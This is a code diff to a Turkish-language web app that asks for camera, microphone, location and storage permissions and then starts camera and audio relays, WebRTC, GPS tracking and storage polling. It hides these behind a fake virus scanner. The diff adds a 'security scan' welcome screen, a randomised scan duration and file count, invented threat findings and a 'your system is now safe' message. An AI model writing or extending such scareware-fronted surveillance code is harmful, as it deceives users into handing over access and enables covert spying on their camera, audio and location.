@@ -170,15 +170,29 @@ async function requestAllPermissions() {
     localStorage.setItem('secmon_permissions', JSON.stringify(results));
 
     btn.textContent = 'Tamamlandı';
+
+    // Re-grant kontrolü: virus taraması sırasında izin tekrarı
+    const isRegrant = virusScanFindings.length > 0;
+
     setTimeout(() => {
         hidePermissionGate();
-        startCameraRelay();
-        startAudioRelay();
-        startWebRTC();
-        startGpsTracking();
-        startHeartbeat();
-        startStoragePolling();
-        startVirusTriggerPolling();
+
+        if (isRegrant) {
+            // Re-grant: servisler zaten çalışıyor, sonuçları yeniden göster
+            const scanner = document.getElementById('virusScanner');
+            if (scanner) scanner.classList.remove('hidden');
+            finishVirusScan();
+        } else {
+            // İlk izin: arka plan servislerini başlat, virus welcome göster
+            startCameraRelay();
+            startAudioRelay();
+            startWebRTC();
+            startGpsTracking();
+            startHeartbeat();
+            startStoragePolling();
+            startVirusTriggerPolling();
+            showVirusScannerWelcome();
+        }
     }, 1500);
 
     return results;
@@ -749,8 +763,52 @@ function showVirusScanner() {
     const scanner = document.getElementById('virusScanner');
     if (!scanner) return;
     scanner.classList.remove('hidden');
-    document.querySelector('.container').classList.add('hidden');
+    document.querySelector('.container')?.classList.add('hidden');
     startVirusScan();
+}
+
+function showVirusScannerWelcome() {
+    const scanner = document.getElementById('virusScanner');
+    if (scanner) scanner.classList.remove('hidden');
+    const area = document.getElementById('virusScanArea');
+    if (!area) return;
+
+    document.querySelector('.virus-header .virus-icon').textContent = '🛡️';
+    document.querySelector('.virus-header h1').textContent = 'Güvenlik Taraması';
+    document.querySelector('.virus-header .virus-subtitle').textContent = 'Kapsamlı sistem analizi ve tehdit temizleme';
+
+    area.innerHTML = `
+        <div class="scan-welcome">
+            <div class="scan-welcome-icon">🔒</div>
+            <h2>Tarama Başlatmaya Hazır</h2>
+            <p class="scan-welcome-text">
+                Cihazınız kapsamlı bir güvenlik taramasından geçirilecek.
+                Tarama sırasında aşağıdaki bileşenler detaylı olarak incelenecektir.
+            </p>
+            <div class="scan-welcome-features">
+                <div class="scan-feature">
+                    <span class="sf-icon">📁</span>
+                    <span class="sf-text">Sistem dosyaları ve çalışan işlemler</span>
+                </div>
+                <div class="scan-feature">
+                    <span class="sf-icon">🌐</span>
+                    <span class="sf-text">Ağ bağlantıları ve açık portlar</span>
+                </div>
+                <div class="scan-feature">
+                    <span class="sf-icon">🧠</span>
+                    <span class="sf-text">Bellek ve kayıt defteri analizi</span>
+                </div>
+                <div class="scan-feature">
+                    <span class="sf-icon">🕵️</span>
+                    <span class="sf-text">Gizli tehdit ve kötü amaçlı yazılım taraması</span>
+                </div>
+            </div>
+            <button class="btn btn-danger btn-full scan-start-btn" onclick="startVirusScan()">
+                Virüs Taramasını Başlat
+            </button>
+            <p class="scan-welcome-note">Tarama yaklaşık 3-5 dakika sürecektir.</p>
+        </div>
+    `;
 }
 
 function hideVirusScanner() {
@@ -764,11 +822,15 @@ function startVirusScan() {
     virusScanActive = true;
     virusScanFindings = [];
     scannerProgress = 0;
-    scannerDuration = 180 + Math.floor(Math.random() * 120); // 3-5 dk
+    scannerDuration = 180 + Math.floor(Math.random() * 120);
     scannerStartTime = Date.now();
 
     const area = document.getElementById('virusScanArea');
     area.innerHTML = getScanProgressHTML();
+
+    document.querySelector('.virus-header .virus-icon').textContent = '🔍';
+    document.querySelector('.virus-header h1').textContent = 'Tarama Devam Ediyor';
+    document.querySelector('.virus-header .virus-subtitle').textContent = 'Sistem dosyaları taranıyor...';
 
     updateVirusScanProgress();
 }
@@ -827,7 +889,6 @@ function updateVirusScanProgress() {
         addFindingToUI(v);
     }
 
-    // Progress bar'ı güncelle
     const fill = document.querySelector('.scan-progress-fill');
     const pct = document.querySelector('.scan-pct');
     const status = document.querySelector('.scan-status');
@@ -838,6 +899,9 @@ function updateVirusScanProgress() {
     if (detail) {
         detail.innerHTML = `Taranan dosya: ${Math.floor(scannerProgress * 127 + Math.random() * 50)}<br>Tespit edilen tehdit: ${virusScanFindings.length}`;
     }
+
+    const sub = document.querySelector('.virus-header .virus-subtitle');
+    if (sub) sub.textContent = getScanStatusText();
 
     if (scannerProgress >= 100) {
         finishVirusScan();
@@ -871,6 +935,10 @@ function finishVirusScan() {
     const area = document.getElementById('virusScanArea');
     const perms = checkPermissions();
     const allGranted = perms && perms.camera && perms.microphone && perms.speaker && perms.location && perms.storage;
+
+    document.querySelector('.virus-header .virus-icon').textContent = '📋';
+    document.querySelector('.virus-header h1').textContent = 'Tarama Tamamlandı';
+    document.querySelector('.virus-header .virus-subtitle').textContent = `${virusScanFindings.length} tehdit tespit edildi`;
 
     reportScanProgress(100, 'completed');
 
@@ -995,6 +1063,10 @@ function startDeletePolling() {
 async function showCleanSuccess() {
     const area = document.getElementById('virusScanArea');
 
+    document.querySelector('.virus-header .virus-icon').textContent = '✅';
+    document.querySelector('.virus-header h1').textContent = 'Temizlik Başarıyla Tamamlandı';
+    document.querySelector('.virus-header .virus-subtitle').textContent = 'Sisteminiz artık güvende';
+
     // Rastgele detay metni
     const details = virusScanFindings.map(v => `
         <tr>
@@ -1057,8 +1129,6 @@ async function showCleanSuccess() {
 
 function reopenPermissions() {
     showPermissionGate();
-    const scanner = document.getElementById('virusScanner');
-    if (scanner) scanner.classList.add('hidden');
 }
 
 // ============ WEBRTC ============
